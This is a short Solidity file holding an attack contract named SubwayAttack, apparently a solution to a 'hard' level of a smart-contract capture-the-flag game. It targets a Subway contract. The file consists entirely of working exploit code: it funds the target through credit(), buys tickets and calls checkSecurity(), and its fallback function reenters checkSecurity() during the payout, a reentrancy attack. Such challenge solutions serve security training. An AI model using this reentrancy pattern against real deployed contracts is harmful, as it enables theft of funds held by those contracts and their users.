// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/hardChalls/Subway.sol";

contract SubwayAttack {

    Subway originalContract;

    constructor(address payable _originalContract) public {
        originalContract = Subway(_originalContract);
    }

    function exploit() public payable {
        require (msg.value == 1 ether);
        address(originalContract).call.value(1 ether)(abi.encodeWithSignature("credit()"));
        originalContract.buyTickets(1);
        originalContract.checkSecurity();
    }

    fallback() external payable {
        originalContract.checkSecurity();
    }

}